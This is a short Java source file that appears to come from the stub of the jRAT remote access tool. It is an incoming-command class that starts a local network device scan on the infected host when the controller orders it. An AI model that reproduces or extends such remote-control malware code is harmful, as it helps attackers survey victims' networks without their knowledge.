package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Lan;

public class Packet71LocalNetworkDevices extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Lan().start();
	}

}
